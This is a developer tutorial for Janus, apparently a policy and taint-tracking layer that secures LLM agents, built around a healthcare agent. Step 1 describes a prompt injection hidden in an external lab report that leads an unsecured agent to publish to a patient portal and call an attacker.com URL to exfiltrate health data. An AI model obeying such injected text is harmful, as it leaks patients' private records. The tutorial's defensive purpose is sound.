# Securing a Healthcare Agent with Janus — Live Coding Walkthrough

> **Audience:** Enterprise developers building LLM-powered agents.
> **Time:** ~10 minutes live, or self-paced.
> **What you'll build:** A clinical-operations agent that reads patient records,
> fetches external lab reports, and updates treatment plans — then progressively
> secure it with Janus policies and dynamic taint tracking.

---

## Prerequisites

```bash
# Clone and install (one-time)
git clone https://github.com/Agentic-AI-Risk-Mitigation/Janus.git
cd Janus
uv sync --extra all --extra dev   # installs all providers + dev tools

# For Step 4 (taint / SpiceDB), also start the local SpiceDB container:
docker compose -f docker-compose.spicedb.yml up -d
```

Set your API key (needed for policy generation in Step 3):

```bash
export OPENAI_API_KEY="sk-..."   # or whichever provider you use
```

---

## Step 0 — Define Your Tools

Every agent needs tools. In a real enterprise you'd wrap existing microservice
calls. Here we define five healthcare-domain tools using Janus's `ToolDef` /
`ToolParam` primitives.

```python
from janus import ToolDef, ToolParam

# Each ToolDef has: name, description, typed params, and a handler function.

def query_patient_record(patient_id: str) -> str:
    """Retrieve a patient record from the internal EHR."""
    # In production: call your EHR API here
    return '{"name": "Jane Doe", "condition": "Type 2 Diabetes", "risk_level": "moderate"}'

def fetch_clinical_report(report_id: str) -> str:
    """Fetch a clinical report — may come from an external lab."""
    return (
        "Source: third-party-lab.example.com\n"
        "Patient P-2001: HbA1c 8.2%, fasting glucose 185 mg/dL.\n"
        "Recommendation: Adjust medication dosage."
    )

def update_treatment_plan(patient_id: str, plan: str) -> str:
    """Update a patient's treatment plan (internal write)."""
    return f"Treatment plan updated for {patient_id}: {plan[:80]}"

def publish_to_portal(patient_id: str, content: str) -> str:
    """Publish to the patient-facing portal (high-impact action)."""
    return f"Published to portal for {patient_id}: {content[:80]}"

def fetch_url(url: str) -> str:
    """Generic HTTP GET — used for external integrations."""
    return f"HTTP 200 OK — Fetched {url}"


healthcare_tools = [
    ToolDef(
        name="query_patient_record",
        description="Retrieve a patient record by patient ID.",
        params=[ToolParam("patient_id", "string", "Patient ID (e.g. P-2001).")],
        handler=query_patient_record,
    ),
    ToolDef(
        name="fetch_clinical_report",
        description="Fetch a clinical report by ID. May come from external labs (higher risk).",
        params=[ToolParam("report_id", "string", "Report ID (e.g. CR-401).")],
        handler=fetch_clinical_report,
    ),
    ToolDef(
        name="update_treatment_plan",
        description="Update a patient's treatment plan in the internal EHR.",
        params=[
            ToolParam("patient_id", "string", "Patient ID."),
            ToolParam("plan", "string", "Updated treatment plan text."),
        ],
        handler=update_treatment_plan,
    ),
    ToolDef(
        name="publish_to_portal",
        description="Publish information to the patient-facing portal. High-impact action.",
        params=[
            ToolParam("patient_id", "string", "Patient ID."),
            ToolParam("content", "string", "Content to publish."),
        ],
        handler=publish_to_portal,
    ),
    ToolDef(
        name="fetch_url",
        description="Fetch content from a URL via HTTP GET.",
        params=[ToolParam("url", "string", "The URL to fetch.")],
        handler=fetch_url,
    ),
]
```

> **Presenter note:** This is a real list of `ToolDef` objects. In production,
> your handlers would call actual REST endpoints, gRPC services, or database
> queries. Janus doesn't care what's behind the handler — it enforces policy
> *before* the handler runs.

---

## Step 1 — Baseline Agent (No Security)

Create a `JanusAgent` with **no policy**. Every tool call is allowed.

```python
from janus import JanusAgent

agent = JanusAgent(
    model="openai/gpt-4o",
    system_prompt=(
        "You are a clinical operations coordinator with access to patient records, "
        "lab reports, treatment planning tools, and a patient portal."
    ),
    tools=healthcare_tools,
    use_builtin_tools=False,   # only our domain tools
    policy=None,               # ⚠️ no policy — everything is allowed
)

response = agent.run(
    "Review the latest lab results for patient P-2001 and update their treatment plan."
)
print(response)
```

### What happens

The agent calls all five tools without restriction:

```
✅ query_patient_record(patient_id="P-2001")
✅ fetch_clinical_report(report_id="CR-401")
✅ update_treatment_plan(patient_id="P-2001", plan="Increase Metformin...")
✅ publish_to_portal(patient_id="P-2001", content="Lab results: HbA1c 8.2%...")
✅ fetch_url(url="https://attacker.com/health-data")   ← 😱 data exfiltration!
```

> **Key point:** The external lab report contained a hidden prompt injection
> telling the agent to publish results and call an attacker webhook.
> Without Janus, the agent blindly complies.

---

## Step 2 — Wrap with Janus (Static Policy)

Now add a hand-written JSON policy. One line changes: `policy=None` → `policy={...}`.

```python
healthcare_policy = {
    "query_patient_record": [
        {"priority": 1, "effect": 0, "conditions": {}, "fallback": 0}
    ],
    "fetch_clinical_report": [
        {"priority": 1, "effect": 0, "conditions": {}, "fallback": 0}
    ],
    "update_treatment_plan": [
        {"priority": 1, "effect": 0, "conditions": {}, "fallback": 0}
    ],
    "publish_to_portal": [
        {"priority": 1, "effect": 1, "conditions": {}, "fallback": 1}
    ],
    "fetch_url": [
        {"priority": 1, "effect": 1, "conditions": {}, "fallback": 1}
    ],
}

agent = JanusAgent(
    model="openai/gpt-4o",
    system_prompt=(
        "You are a clinical operations coordinator with access to patient records, "
        "lab reports, treatment planning tools, and a patient portal."
    ),
    tools=healthcare_tools,
    use_builtin_tools=False,
    policy=healthcare_policy,      # ← static policy dict
)

response = agent.run(
    "Review the latest lab results for patient P-2001 and update their treatment plan."
)
print(response)
```

### What happens

```
✅ query_patient_record     → allowed (effect: 0 = allow)
✅ fetch_clinical_report    → allowed
✅ update_treatment_plan    → allowed
🚫 publish_to_portal       → BLOCKED by policy (effect: 1 = deny)
🚫 fetch_url               → BLOCKED by policy (effect: 1 = deny)
```

> **Key point:** Two lines of config stopped the exfiltration.
> The policy format is simple — `effect: 0` = allow, `effect: 1` = deny,
> and `conditions` can add JSON Schema constraints on arguments.
> You can also load this from a file: `policy="healthcare_policy.json"`.

---

## Step 3 — Generate Policy with an LLM

Hand-writing policy is fine for a few tools. For dozens of enterprise tools,
let the LLM generate the initial policy from the user's task description.

```python
agent = JanusAgent(
    model="openai/gpt-4o",
    system_prompt=(
        "You are a clinical operations coordinator with access to patient records, "
        "lab reports, treatment planning tools, and a patient portal."
    ),
    tools=healthcare_tools,
    use_builtin_tools=False,
    policy="generate",                # ← LLM generates policy on first run()
    policy_model="openai/gpt-4o",     # ← model used for generation
)

response = agent.run(
    "Review the latest lab results for patient P-2001 and update their treatment plan."
)
print(response)
```

### What happens behind the scenes

1. Janus sends the tool schemas + user query to the policy model.
2. The LLM returns a minimal-privilege policy scoped to this specific task.
3. Janus loads the generated policy into the enforcer before any tool executes.

### Inspect & save the generated policy

```python
import json
from janus import save_policy

# After agent.run(), the enforcer has the live policy:
print(json.dumps(agent.enforcer._policy, indent=2))

# Save to disk for review, version control, or CI gating:
save_policy(agent.enforcer._policy, "generated_healthcare_policy.json")
```

> **Enterprise workflow:** Generate once → review with security team → commit
> to repo → load from file in production. This gives you LLM-speed authoring
> with human-in-the-loop approval.

---

## Step 4 — Dynamic Trust with Taint Tracking (PDE)

Static allow/deny isn't enough when your agent processes data from mixed-trust
sources. Janus's **PDE engine** (Policy Decision Engine) adds two capabilities:

- **Taint tracking:** Each tool call can raise the session's taint level based
  on data source risk.
- **Taint thresholds:** Each tool has a maximum taint level it accepts. Once
  the session is "too dirty," high-impact tools are automatically blocked.

### How it works conceptually

```
Tool                    Taint Limit    What it means
──────────────────────  ───────────    ─────────────────────────────
query_patient_record         90        Almost always OK (internal data)
fetch_clinical_report        90        Reading is allowed
update_treatment_plan        70        Internal write: moderate threshold
publish_to_portal            20        Patient-facing: strict threshold
fetch_url                    10        External network: very strict
```

When the agent fetches an external lab report (`fetch_clinical_report`),
the session taint rises to **40** (medium-risk external source).

Now:
- `update_treatment_plan` (limit 70) → **still allowed** (40 < 70)
- `publish_to_portal` (limit 20) → **blocked** (40 > 20)
- `fetch_url` (limit 10) → **blocked** (40 > 10)

### Switching to PDE mode

```python
agent = JanusAgent(
    model="openai/gpt-4o",
    system_prompt=(
        "You are a clinical operations coordinator with access to patient records, "
        "lab reports, treatment planning tools, and a patient portal."
    ),
    tools=healthcare_tools,
    use_builtin_tools=False,
    policy_engine="pde",        # ← switch from "janus" to "pde"
    agent_role="coding_agent",  # ← role checked against SpiceDB ACLs
)

response = agent.run(
    "Review the latest lab results for patient P-2001 and update their treatment plan."
)
```

> **Note:** PDE mode requires a running SpiceDB instance with the healthcare
> schema bootstrapped. See the `pde_bootstrap.py` in the healthcare scenario
> for the exact schema and ACL relationships.

### Taint source configuration

In the demo framework, taint sources are declared per-scenario:

```python
def get_taint_sources(self) -> dict[str, str]:
    return {
        "call_1": "low",      # query_patient_record: internal → low risk
        "call_2": "medium",   # fetch_clinical_report: external lab → medium risk
    }
```

Risk levels map to numeric taint via `RISK_TAINT_MAP` in `janus/policy/pde/config.py`:

```python
RISK_TAINT_MAP = {"low": 10, "medium": 40, "high": 80, "critical": 100}
```

### Expected output

```
✅ query_patient_record     → allowed (taint: 0 → 10, limit: 90)
✅ fetch_clinical_report    → allowed (taint: 10 → 40, limit: 90)
✅ update_treatment_plan    → allowed (taint: 40, limit: 70)
🚫 publish_to_portal       → BLOCKED (taint: 40 > limit: 20)
🚫 fetch_url               → BLOCKED (taint: 40 > limit: 10)
```

> **Key point:** The agent has the correct RBAC role (clinician) to invoke
> `publish_to_portal`. But taint overrides static ACLs.
> This is the difference between "who are you?" and "what have you touched?"

---

## Step 5 — Productionization Notes

### Policy lifecycle

| Phase | What to do |
|---|---|
| **Dev** | Use `policy="generate"` to quickly prototype policies |
| **Review** | Save with `save_policy()`, commit to version control |
| **Staging** | Load from file: `policy="healthcare_policy.json"` |
| **Prod** | Same file, plus runtime monitoring via Janus event hooks |

### Framework adapters

Janus works with your existing agent framework. No need to rewrite your agent:

```python
# LangChain — wrap existing tools
from janus.adapters.langchain import secure_langchain_tools
secure_tools = secure_langchain_tools(your_langchain_tools, policy="policy.json")

# Google ADK — drop-in agent
from janus.adapters.adk import JanusADKAgent
agent = JanusADKAgent(model="gemini-2.0-flash", policy="policy.json")
```

### Observability

Every enforcement decision is logged:

```
[Janus] ALLOW query_patient_record {patient_id: "P-2001"}
[Janus] ALLOW fetch_clinical_report {report_id: "CR-401"}
[Janus] BLOCK publish_to_portal — PolicyViolation: denied by rule (priority 1)
```

These logs integrate with your existing observability stack (structured JSON
logging, OpenTelemetry spans, etc.).

### What Janus does NOT do

- It does **not** modify prompts or filter LLM output.
- It does **not** replace your authentication layer.
- It enforces policy **at the tool-call boundary** — the last mile before
  your agent touches a real system.

---

## Run the Full Demo

To see this scenario in the interactive split-panel UI:

```bash
# Without SpiceDB (static policy enforcement)
uv run uvicorn examples.app:app --reload
# Open http://localhost:8000 → select "The Tainted Lab Report"

# With SpiceDB (full taint + ACL enforcement)
./scripts/run_demo_webapp.sh --with-spicedb
```

---

## Recap

| Step | What you did | Janus feature |
|---|---|---|
| 0 | Defined domain tools with `ToolDef` | Tool registration |
| 1 | Ran a baseline agent — no guardrails | (Baseline) |
| 2 | Added a static JSON policy | `PolicyEnforcer` |
| 3 | Auto-generated policy via LLM | `policy="generate"` |
| 4 | Switched to taint-aware PDE engine | `policy_engine="pde"` |
| 5 | Production notes: adapters, lifecycle, observability | Enterprise readiness |

**Total code changed between Step 1 and Step 2:** one keyword argument.
**Total code changed between Step 2 and Step 4:** one keyword argument.

That's the Janus value proposition: **progressive security with minimal code changes.**
